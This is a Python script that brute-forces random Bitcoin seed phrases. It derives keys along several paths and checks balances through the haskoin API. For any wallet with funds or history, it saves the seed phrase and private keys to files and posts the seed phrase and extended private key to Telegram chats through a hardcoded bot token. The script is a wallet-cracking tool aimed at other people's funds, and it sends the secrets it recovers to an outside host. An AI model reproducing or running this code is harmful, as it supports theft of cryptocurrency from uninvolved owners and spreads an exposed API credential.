from concurrent.futures import ThreadPoolExecutor
import concurrent.futures
from mnemonic import Mnemonic
from hdwallet import HDWallet
import hashlib
import base58
import binascii
import json
import requests
import random
import os, sys, platform
is_windows = True if platform.system() == "Windows" else False

if is_windows:
    os.system("title Mizogg @ github.com/Mizogg")

def red(text):
    os.system(""); faded = ""
    for line in text.splitlines():
        green = 250
        for character in line:
            green -= 5
            if green < 0:
                green = 0
            faded += (f"\033[38;2;255;{green};0m{character}\033[0m")
        faded += "\n"
    return faded

def blue(text):
    os.system(""); faded = ""
    for line in text.splitlines():
        green = 0
        for character in line:
            green += 3
            if green > 255:
                green = 255
            faded += (f"\033[38;2;0;{green};255m{character}\033[0m")
        faded += "\n"
    return faded

def water(text):
    os.system(""); faded = ""
    green = 10
    for line in text.splitlines():
        faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return faded

def gold(text):
    os.system("")
    faded = ""
    red = 255
    green = 215
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};{green};0m{line}\033[0m\n")
        if not green == 255:
            green += 10
            if green > 255:
                green = 255
    return faded
    
def purple(text):
    os.system("")
    faded = ""
    down = False

    for line in text.splitlines():
        red = 40
        for character in line:
            if down:
                red -= 3
            else:
                red += 3
            if red > 254:
                red = 255
                down = True
            elif red < 1:
                red = 30
                down = False
            faded += (f"\033[38;2;{red};0;220m{character}\033[0m")
    return faded
    
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})

session1 = requests.Session()
session1.headers.update({'User-Agent': 'Mozilla/5.0'})

def check_xpub(account_extended_public_key):
    try:
        response = requests.get(f'https://api.haskoin.com/btc/xpub/{account_extended_public_key}?derive=normal')
        if response.status_code == 200:
            response_data = response.json()
            balance_info = response_data.get("balance", {})
            confirmed_balance = balance_info.get("confirmed", 0)
            unconfirmed_balance = balance_info.get("unconfirmed", 0)
            received = balance_info.get("received", 0)
            external = response_data["indices"]["external"]

            return confirmed_balance / 10**8, unconfirmed_balance / 10**8, received / 10**8, external
        else:
            print(f'Error getting xpub information: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Error sending request for xpub information: {str(e)}')

    # Return 0 if there's any error or if the response is not 200
    return 0, 0, 0, 0
    
def check_balance(address):
    try:
        response = requests.get(f"https://api.haskoin.com/btc/address/{address}/balance")
        if response.status_code == 200:
            data = response.json()
            confirmed_balance = data.get("confirmed", 0)
            unconfirmed_balance = data.get("unconfirmed", 0)
            tx_count = data.get("txs", 0)
            received = data.get("received", 0)

            # Convert satoshis to BTC
            balance = confirmed_balance / 10**8
            totalSent = unconfirmed_balance / 10**8
            totalReceived = received / 10**8
            return balance, totalReceived, totalSent, tx_count
        else:
            print('API request failed with status code:', response.status_code)
    except json.JSONDecodeError:
        print('Error decoding JSON response from API')

def process_derivation(words, derivation, p):
    try:
        hdwallet = HDWallet().from_mnemonic(words)
        wallet = hdwallet.from_mnemonic(words)
        path = f"{derivation}/{p}"
        hdwallet.from_path(path=path)
        path_read = hdwallet.path()
        private_key = hdwallet.private_key()
        root_public_key = hdwallet.xpublic_key()
        extended_private_key = hdwallet.xprivate_key()
        root_extended_private_key = hdwallet.root_xprivate_key()
        compressed_public_key = hdwallet.public_key(compressed=True)
        uncompressed_public_key = '04' + hdwallet.public_key(compressed=False)
        compressed_address_bytes = hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(compressed_public_key)).digest()).digest()
        compressed_address = base58.b58encode_check(b'\x00' + compressed_address_bytes)
        uncompressed_address_bytes = hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(uncompressed_public_key)).digest()).digest()
        uncompressed_address = base58.b58encode_check(b'\x00' + uncompressed_address_bytes)
        wif_private_key = base58.b58encode_check(b'\x80' + binascii.unhexlify(private_key)).decode()
        wif_compressed_private_key = base58.b58encode_check(b'\x80' + binascii.unhexlify(private_key) + b'\x01').decode()
        caddr = compressed_address.decode('utf-8')
        uaddr = uncompressed_address.decode('utf-8')
        balance_derivationc, totalReceived_derivationc, totalSent_derivationc, txs_derivationc = check_balance(caddr)
        balance_derivationu, totalReceived_derivationu, totalSent_derivationu, txs_derivationu = check_balance(uaddr)

        derived_info = {
            "derivation_path": path,
            "compressed_address": caddr,
            "uncompressed_address": uaddr,
            "balance_derivationc": balance_derivationc,
            "totalReceived_derivationc": totalReceived_derivationc,
            "totalSent_derivationc": totalSent_derivationc,
            "txs_derivationc": txs_derivationc,
            "balance_derivationu": balance_derivationu,
            "totalReceived_derivationu": totalReceived_derivationu,
            "totalSent_derivationu": totalSent_derivationu,
            "txs_derivationu": txs_derivationu,
            "mnemonic_words": words,
            "private_key": private_key,
            "root_public_key": root_public_key,
            "extended_private_key": extended_private_key,
            "root_extended_private_key": root_extended_private_key,
            "compressed_public_key": compressed_public_key,
            "uncompressed_public_key": uncompressed_public_key,
            "wif_private_key": wif_private_key,
            "wif_compressed_private_key": wif_compressed_private_key
        }

        return derived_info

    except Exception as e:
        print(red(f'Error occurred in derivation {derivation}/{p}: {str(e)}'), end="")
        return None

def send_to_telegram(id, text):
            apiToken = "5151775449:AAFq7th1uXwhl-5WAxWqzRVbugS9Tx8wK_0"
            chatID = id
            apiURL = f"https://api.telegram.org/bot{apiToken}/sendMessage"

            try:
                response = requests.post(apiURL, json={"chat_id": chatID, "text": text})
                # print(response)
                response.raise_for_status()
            except requests.exceptions.HTTPError as errh:
                print(f"HTTP Error: {errh}")
            except Exception as e:
                print(f"Telegram error: {str(e)}")

def mnemonic_main(words):
    try:
                hdwallet = HDWallet().from_mnemonic(words)
                hdwallet.from_path("m/44'/0'/0'")
                account_extended_private_key = hdwallet.xprivate_key()
                account_extended_public_key = hdwallet.xpublic_key()
                balance_initial, totalReceived_initial, totalSent_initial, txs_initial = check_xpub(account_extended_public_key)
                print(purple(f"Words: {words}") + "\033[38;2;148;0;230m")
                print(blue("Account Extended Private Key:"), end="")
                print(blue(account_extended_private_key), end="")
                print(blue("Account Extended Public Key:"), end="")
                print(blue(account_extended_public_key), end="")
                print(blue(f'\n Balance: {balance_initial}  TotalReceived: {totalReceived_initial} TotalSent: {totalSent_initial} Txs: {txs_initial}'), end="")
                print()
                # send_to_telegram("-1001799632869", words)
                telegram_message = f"Words: {words}\nAccount Extended Private Key: {account_extended_private_key}\nAccount Extended Public Key: {account_extended_public_key}\nBalance: {balance_initial}\nTotalReceived: {totalReceived_initial}\nTotalSent: {totalSent_initial}\nTxs: {txs_initial}\n"
                
                if balance_initial > 0 or totalReceived_initial > 0 or totalSent_initial > 0 or txs_initial > 0:
                    found_count = 1
                    print("Balance or other important values found in initial Account Extended Public Key.")
                    with open('found.txt', 'a') as file:
                        file.write("Initial Balance Check\n")
                        file.write(f"Words: {words}\n")
                        file.write(f"Account Extended Public Key: {account_extended_public_key}\n")
                        file.write(f"Balance: {balance_initial}  TotalReceived: {totalReceived_initial} TotalSent: {totalSent_initial} Txs: {txs_initial}\n\n")
                    
                    send_to_telegram("-1001752302807", telegram_message)

                    derivations = ["m/44'/0'/0'/0", "m/0", "m/0'/0'", "m/0'/0", "m/44'/0'/0'"]

                    with ThreadPoolExecutor(max_workers=10) as executor:
                        futures = []
                        for derivation in derivations:
                            for p in range(0, 2):
                                future = executor.submit(process_derivation, words, derivation, p)
                                futures.append(future)

                        for future in concurrent.futures.as_completed(futures):
                            derived_info = future.result()
                            if derived_info:
                                path = derived_info["derivation_path"]
                                caddr = derived_info["compressed_address"]
                                uaddr = derived_info["uncompressed_address"]
                                balance_derivationc = derived_info["balance_derivationc"]
                                totalReceived_derivationc = derived_info["totalReceived_derivationc"]
                                totalSent_derivationc = derived_info["totalSent_derivationc"]
                                txs_derivationc = derived_info["txs_derivationc"]
                                balance_derivationu = derived_info["balance_derivationu"]
                                totalReceived_derivationu = derived_info["totalReceived_derivationu"]
                                totalSent_derivationu = derived_info["totalSent_derivationu"]
                                txs_derivationu = derived_info["txs_derivationu"]
                                private_key = derived_info["private_key"]
                                root_public_key = derived_info["root_public_key"]
                                extended_private_key = derived_info["extended_private_key"]
                                root_extended_private_key = derived_info["root_extended_private_key"]
                                compressed_public_key = derived_info["compressed_public_key"]
                                uncompressed_public_key = derived_info["uncompressed_public_key"]
                                wif_private_key = derived_info["wif_private_key"]
                                wif_compressed_private_key = derived_info["wif_compressed_private_key"]

                                print(f"\nDerivation Path: {path}")
                                print(f"Compressed Address: {caddr}")
                                print(f'Compressed Balance: {balance_derivationc}  TotalReceived: {totalReceived_derivationc} TotalSent: {totalSent_derivationc} Txs: {txs_derivationc}')
                                print(f"Uncompressed Address: {uaddr}")
                                print(f'Uncompressed Balance: {balance_derivationu}  TotalReceived: {totalReceived_derivationu} TotalSent: {totalSent_derivationu} Txs: {txs_derivationu}')
                                print(f"Mnemonic words: {words}")
                                print(f"Private Key: {private_key}")
                                print(f"Root Public Key: {root_public_key}")
                                print(f"Extended Private Key: {extended_private_key}")
                                print(f"Root Extended Private Key: {root_extended_private_key}")
                                print(f"Compressed Public Key: {compressed_public_key}")
                                print(f"Uncompressed Public Key: {uncompressed_public_key}")
                                print(f"WIF Private Key: {wif_private_key}")
                                print(f"WIF Compressed Private Key: {wif_compressed_private_key}")

                                if int(balance_derivationc) > 0 or int(txs_derivationc) > 0 or int(balance_derivationu) > 0 or int(txs_derivationu) > 0:
                                    found_count += 1
                                    with open('found_info.txt', 'a') as file:
                                        file.write(f"\nDerivation Path: {path}\n")
                                        file.write(f"Compressed Address: {caddr}\n")
                                        file.write(f"Compressed Balance: {balance_derivationc}  TotalReceived: {totalReceived_derivationc} TotalSent: {totalSent_derivationc} Txs: {txs_derivationc}\n")
                                        file.write(f"Uncompressed Address: {uaddr}\n")
                                        file.write(f"Uncompressed Balance: {balance_derivationu}  TotalReceived: {totalReceived_derivationu} TotalSent: {totalSent_derivationu} Txs: {txs_derivationu}\n")
                                        file.write(f"Mnemonic Words: {words}\n")
                                        file.write(f"Private Key: {private_key}\n")
                                        file.write(f"Root Public Key: {root_public_key}\n")
                                        file.write(f"Extended Private Key: {extended_private_key}\n")
                                        file.write(f"Root Extended Private Key: {root_extended_private_key}\n")
                                        file.write(f"Compressed Public Key: {compressed_public_key}\n")
                                        file.write(f"Uncompressed Public Key: {uncompressed_public_key}\n")
                                        file.write(f"WIF Private Key: {wif_private_key}\n")
                                        file.write(f"WIF Compressed Private Key: {wif_compressed_private_key}\n")
                                        file.write("\n")
                                    
                                    send_to_telegram("-1001752302807", telegram_message + f"\nDerivation Path: {path}\nCompressed Address: {caddr}\nCompressed Balance: {balance_derivationc}\nTotalReceived: {totalReceived_derivationc}\nTotalSent: {totalSent_derivationc}\nTxs: {txs_derivationc}\nUncompressed Address: {uaddr}\nUncompressed Balance: {balance_derivationu}\nTotalReceived: {totalReceived_derivationu}\nTotalSent: {totalSent_derivationu}\nTxs: {txs_derivationu}\n")

                    if found_count > 0:
                        print("Found count:", found_count)
                    else:
                        print("No balance or other important values found in any derivation path.")
                        send_to_telegram("-1001799632869", "No balance or other important values found in any derivation path.")

    except Exception as e:
                print(f"Error occurred in mnemonic_main: {str(e)}")
                send_to_telegram("-1001799632869", f"Error occurred in mnemonic_main: {str(e)}")

if __name__ == '__main__':

        Lang = "1"
        random_language = Lang.strip() == ""

        R = "12"
        random_selection = R.strip() == ""

        while True:
            if random_selection:
                R = random.choice([12, 15, 18, 21, 24])
                print(purple(f'Random selection:  {R} words')+ "\033[38;2;148;0;230m")
            else:
                R = int(R)

            if R == 12:
                s1 = 128
            elif R == 15:
                s1 = 160
            elif R == 18:
                s1 = 192
            elif R == 21:
                s1 = 224
            elif R == 24:
                s1 = 256
            else:
                print(red("WRONG NUMBER!!! Starting with 24 Words"), end="")
                s1 = 256

            if random_language:
                Lang = random.choice(["1", "2", "3", "4", "5", "6", "7", "8"])
                language_mappings = {
                    "1": ("english", "English"),
                    "2": ("french", "French"),
                    "3": ("italian", "Italian"),
                    "4": ("spanish", "Spanish"),
                    "5": ("chinese_simplified", "Chinese Simplified"),
                    "6": ("chinese_traditional", "Chinese Traditional"),
                    "7": ("japanese", "Japanese"),
                    "8": ("korean", "Korean")
                }
                Lang1, language_name = language_mappings[Lang]
                print(purple(f'Random language selection: {language_name}')+ "\033[38;2;148;0;230m")
            else:
                Lang = int(Lang)
                language_mappings = {
                    1: ("english", "English"),
                    2: ("french", "French"),
                    3: ("italian", "Italian"),
                    4: ("spanish", "Spanish"),
                    5: ("chinese_simplified", "Chinese Simplified"),
                    6: ("chinese_traditional", "Chinese Traditional"),
                    7: ("japanese", "Japanese"),
                    8: ("korean", "Korean")
                }
                Lang1, language_name = language_mappings.get(Lang, ("english", "English"))
                print(purple(f'Language selection: {language_name}')+ "\033[38;2;148;0;230m")

            mnemonic = Mnemonic(Lang1)
            words = mnemonic.generate(strength=s1)
            mnemonic_main(words)
